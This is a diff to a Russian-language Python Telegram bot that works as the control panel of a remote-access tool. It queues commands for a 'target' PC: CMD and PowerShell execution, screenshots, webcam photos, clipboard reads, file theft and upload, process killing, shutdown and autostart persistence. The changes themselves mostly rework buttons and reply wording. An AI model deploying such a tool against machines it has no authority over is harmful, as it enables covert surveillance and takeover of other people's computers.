@@ -119,32 +119,32 @@ PAGES = [
 ]
 
 PROMPT_ACTIONS = {
-    "💬 MSG": ("msg", "Текст сообщения:"),
-    "⚡ CMD": ("cmd", "CMD-команда:"),
-    "🖱 Клик": ("click", "Координаты клика в формате x,y:"),
-    "🖱 Мышь": ("mouse", "Координаты мыши в формате x,y:"),
-    "⌨️ Клавиша": ("key", "Клавиша (например enter, space, a):"),
-    "🚀 Запуск": ("run", "Путь или команда для запуска:"),
-    "📦 Переместить": ("move", "Откуда > куда:"),
-    "🔍 Поиск": ("search", "Имя папки или файла:"),
-    "📥 Скачать": ("dl", "Путь к файлу:"),
-    "📤 Push": ("push", "Текст для отправки:"),
+    "💬 MSG": ("msg", "Слушаю и повинуюсь, сэр! Введите текст сообщения для вывода на экран:"),
+    "⚡ CMD": ("cmd", "Введите CMD-команду, шеф:"),
+    "🖱 Клик": ("click", "Координаты клика (x,y), сэр:"),
+    "🖱 Мышь": ("mouse", "Формат x,y, шеф:"),
+    "⌨️ Клавиша": ("key", "Какую кнопку нажать? (например enter, space, a):"),
+    "🚀 Запуск": ("run", "Что запускаем, хозяин? (путь или команда):"),
+    "📦 Переместить": ("move", "Что куда тащим? Формат: откуда > куда, шеф:"),
+    "🔍 Поиск": ("search", "(имя папки или файла):"),
+    "📥 Скачать": ("dl", "Какой файлик стянуть для вас, сэр? Укажите полный путь:"),
+    "📤 Push": ("push", "Какой текст загрузить в буфер обмена на том конце, шеф?"),
 }
 
 BUTTON_COMMANDS = {
-    "📸 Скрин": ("screen", "Запросил скриншот"),
-    "ℹ️ Инфо": ("info", "Запросил информацию"),
-    "📋 Процессы": ("procs", "Запросил список процессов"),
-    "📂 Файлы": ("ls:", "Запросил список файлов"),
-    "📋 Буфер": ("clip", "Запросил буфер обмена"),
-    "🔒 Блок": ("lock", "Запросил блокировку"),
-    "🔊 Громкость+": ("volume:up", "Громкость выше"),
-    "🔉 Громкость-": ("volume:down", "Громкость ниже"),
-    "🔇 Мут": ("volume:mute", "Переключил звук"),
-    "🎥 Камера": ("webcam", "Запросил фото с камеры"),
-    "💀 Выкл": ("shutdown", "Запросил выключение"),
-    "🔄 Рестарт": ("restart", "Запросил перезагрузку"),
-    "🏠 Авто": ("startup", "Запросил настройку автозапуска"),
+    "📸 Скрин": ("screen", "делаю фотку шеф! 📸😎"),
+    "ℹ️ Инфо": ("info", "Секунду сэр"),
+    "📋 Процессы": ("procs", "Секунду сэр! 🕵️‍♂️📋"),
+    "📂 Файлы": ("ls:", "Открываю картотеку шеф! 📂👀"),
+    "📋 Буфер": ("clip", "Будет исполнено! 📋🤫"),
+    "🔒 Блок": ("lock", "Компьютер отправлен в глубокий сон сэр! 🔒💤"),
+    "🔊 Громкость+": ("volume:up", "Делаю погромче шеф! 🔊💥"),
+    "🔉 Громкость-": ("volume:down", "Делаю потише, сэр 🔉💤"),
+    "🔇 Мут": ("volume:mute", "Звук на выключен сэр! 🔇🤫"),
+    "🎥 Камера": ("webcam", "Улыбочку! 🎥"),
+    "💀 Выкл": ("shutdown", "До связи! Тушу свет, шеф 💀💤"),
+    "🔄 Рестарт": ("restart", "Перезагружаю... 🔄"),
+    "🏠 Авто": ("startup", "Прописываюсь в автозапуск сэр"),
 }
 
 STATE_TO_COMMAND = {
@@ -171,10 +171,22 @@ def is_admin(message) -> bool:
     return bool(message and message.chat and message.chat.id == settings.admin_id)
 
 
-def keyboard(page: int = 0) -> telebot.types.ReplyKeyboardMarkup:
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+def inline_keyboard(page: int = 0) -> telebot.types.InlineKeyboardMarkup:
+    markup = telebot.types.InlineKeyboardMarkup()
     for row in PAGES[page]:
-        markup.row(*row)
+        buttons = []
+        for btn in row:
+            if btn == "➡️":
+                buttons.append(telebot.types.InlineKeyboardButton(text="➡️ Следующая", callback_data=f"page:{page+1}"))
+            elif btn == "⬅️":
+                buttons.append(telebot.types.InlineKeyboardButton(text="Предыдущая ⬅️", callback_data=f"page:{page-1}"))
+            elif btn in PROMPT_ACTIONS:
+                buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data=f"prompt:{btn}"))
+            elif btn in BUTTON_COMMANDS:
+                buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data=f"cmd:{btn}"))
+            else:
+                buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data="noop"))
+        markup.row(*buttons)
     return markup
 
 
@@ -395,11 +407,58 @@ def start(message):
     page_by_chat[message.chat.id] = 0
     status = "🟢 онлайн" if pc_online() else "🔴 офлайн"
     text = (
-        f"{status}\n"
-        "Панель управления\n\n"
-        "Команды: /cmd, /ps, /screen, /info, /ls, /dl, /kill"
+        f"👋 Приветствую, мой повелитель!\n\n"
+        f"Статус цели: {status}\n"
+        f"Последний пинг: {last_seen_text()}\n\n"
+        f"Выберите команду на панели управления, сэр: 👇"
     )
-    bot.send_message(message.chat.id, text, reply_markup=keyboard(0))
+    bot.send_message(message.chat.id, text, reply_markup=inline_keyboard(0))
+
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    chat_id = call.message.chat.id
+    if chat_id != settings.admin_id:
+        return
+
+    data = call.data
+
+    if data.startswith("page:"):
+        target_page = int(data.split(":")[1])
+        page_by_chat[chat_id] = target_page
+        status = "🟢 онлайн" if pc_online() else "🔴 офлайн"
+        text = (
+            f"👋 Приветствую, мой повелитель!\n\n"
+            f"Статус цели: {status}\n"
+            f"Последний пинг: {last_seen_text()}\n\n"
+            f"Выберите команду на панели управления, сэр: 👇"
+        )
+        try:
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                text=text,
+                reply_markup=inline_keyboard(target_page)
+            )
+        except Exception:
+            pass
+        bot.answer_callback_query(call.id)
+
+    elif data.startswith("cmd:"):
+        btn_text = data.split(":", 1)[1]
+        command, reply = BUTTON_COMMANDS[btn_text]
+        enqueue(command)
+        bot.answer_callback_query(call.id, text=reply, show_alert=True)
+
+    elif data.startswith("prompt:"):
+        btn_text = data.split(":", 1)[1]
+        state, prompt = PROMPT_ACTIONS[btn_text]
+        state_by_chat[chat_id] = state
+        bot.send_message(chat_id, prompt)
+        bot.answer_callback_query(call.id)
+
+    elif data == "noop":
+        bot.answer_callback_query(call.id)
 
 
 @bot.message_handler(commands=["cmd"])
@@ -410,10 +469,10 @@ def handle_cmd(message):
     command = message.text.partition(" ")[2].strip()
     if command:
         enqueue(f"cmd:{command}")
-        bot.send_message(message.chat.id, f"⏳ {command}")
+        bot.send_message(message.chat.id, f"🫡 Слушаюсь! Команда отправлена: {command}")
     else:
         state_by_chat[message.chat.id] = "cmd"
-        bot.send_message(message.chat.id, "Введи CMD-команду:")
+        bot.send_message(message.chat.id, "Введи CMD-команду, шеф:")
 
 
 @bot.message_handler(commands=["ps"])
@@ -424,24 +483,24 @@ def handle_ps(message):
     command = message.text.partition(" ")[2].strip()
     if command:
         enqueue(f"ps:{command}")
-        bot.send_message(message.chat.id, f"⏳ {command}")
+        bot.send_message(message.chat.id, f"🫡 Понял! PowerShell запущен: {command}")
     else:
         state_by_chat[message.chat.id] = "ps"
-        bot.send_message(message.chat.id, "Введи PowerShell-команду:")
+        bot.send_message(message.chat.id, "Введи PowerShell-команду, сэр:")
 
 
 @bot.message_handler(commands=["screen"])
 def handle_screen(message):
     if is_admin(message):
         enqueue("screen")
-        bot.send_message(message.chat.id, "📸 Запросил скриншот")
+        bot.send_message(message.chat.id, "Опа, делаю фотку, шеф! Сейчас прилетит 📸😎")
 
 
 @bot.message_handler(commands=["info"])
 def handle_info(message):
     if is_admin(message):
         enqueue("info")
-        bot.send_message(message.chat.id, "ℹ️ Запросил информацию")
+        bot.send_message(message.chat.id, "Секунду, сэр, сейчас выгружу всю подноготную этого ведра с гайками 🖥️🔍")
 
 
 @bot.message_handler(commands=["ls"])
@@ -451,7 +510,7 @@ def handle_ls(message):
 
     path = message.text.partition(" ")[2].strip()
     enqueue(f"ls:{path}")
-    bot.send_message(message.chat.id, "📂 Запросил список файлов")
+    bot.send_message(message.chat.id, "Открываю картотеку, шеф! Загружаю файлы 📂👀")
 
 
 @bot.message_handler(commands=["dl"])
@@ -462,10 +521,10 @@ def handle_dl(message):
     path = message.text.partition(" ")[2].strip()
     if path:
         enqueue(f"dl:{path}")
-        bot.send_message(message.chat.id, "📥 Запросил файл")
+        bot.send_message(message.chat.id, "Уже тащу этот файл, сэр! 📥")
     else:
         state_by_chat[message.chat.id] = "dl"
-        bot.send_message(message.chat.id, "Путь к файлу:")
+        bot.send_message(message.chat.id, "Какой файлик стянуть для вас, сэр? Укажите полный путь:")
 
 
 @bot.message_handler(commands=["kill"])
@@ -476,10 +535,10 @@ def handle_kill(message):
     process = message.text.partition(" ")[2].strip()
     if process:
         enqueue(f"kill:{process}")
-        bot.send_message(message.chat.id, f"⏳ {process}")
+        bot.send_message(message.chat.id, f"🔫 Устраняю процесс {process}, сэр!")
     else:
         state_by_chat[message.chat.id] = "kill"
-        bot.send_message(message.chat.id, "Имя процесса или PID:")
+        bot.send_message(message.chat.id, "Имя процесса или PID на ликвидацию, шеф:")
 
 
 @bot.message_handler(content_types=["document"], func=is_admin)
@@ -493,36 +552,23 @@ def handle_document(message):
         data = bot.download_file(file_info.file_path)
         target.write_bytes(data)
         enqueue(f"upload:{safe_name}")
-        bot.send_message(message.chat.id, "📤 Файл поставлен в очередь")
+        bot.send_message(message.chat.id, "📥 Принял файлик! Поставил в очередь на загрузку, сэр!")
     except Exception as exc:
         logger.exception("Failed to queue Telegram document")
-        bot.send_message(message.chat.id, f"Ошибка загрузки: {exc}")
+        bot.send_message(message.chat.id, f"Упс, фатальная ошибочка при загрузке: {exc}")
 
 
 @bot.message_handler(content_types=["text"], func=is_admin)
 def handle_text(message):
     text = message.text.strip()
     chat_id = message.chat.id
-    current_page = page_by_chat.get(chat_id, 0)
-
-    if text == "➡️":
-        current_page = min(current_page + 1, len(PAGES) - 1)
-        page_by_chat[chat_id] = current_page
-        bot.send_message(chat_id, f"Страница {current_page + 1}/{len(PAGES)}", reply_markup=keyboard(current_page))
-        return
-
-    if text == "⬅️":
-        current_page = max(current_page - 1, 0)
-        page_by_chat[chat_id] = current_page
-        bot.send_message(chat_id, f"Страница {current_page + 1}/{len(PAGES)}", reply_markup=keyboard(current_page))
-        return
 
     state = state_by_chat.pop(chat_id, None)
     if state:
         command = STATE_TO_COMMAND.get(state)
         if command:
             enqueue(f"{command}:{text}")
-            bot.send_message(chat_id, "⏳ Команда отправлена")
+            bot.send_message(chat_id, f"🫡 Так точно! Отправил команду {command} с вашими параметрами.")
         return
 
     if text == "📊 Статус":
@@ -530,16 +576,7 @@ def handle_text(message):
         bot.send_message(chat_id, f"{status}\nПоследний пинг: {last_seen_text()}")
         return
 
-    if text in PROMPT_ACTIONS:
-        state, prompt = PROMPT_ACTIONS[text]
-        state_by_chat[chat_id] = state
-        bot.send_message(chat_id, prompt)
-        return
-
-    if text in BUTTON_COMMANDS:
-        command, reply = BUTTON_COMMANDS[text]
-        enqueue(command)
-        bot.send_message(chat_id, reply)
+    bot.send_message(chat_id, "Хм, сэр, я вас не совсем понял. Воспользуйтесь нашей божественной интерактивной панелью: /menu")
 
 
 # ---------------------------------------------------------------------------
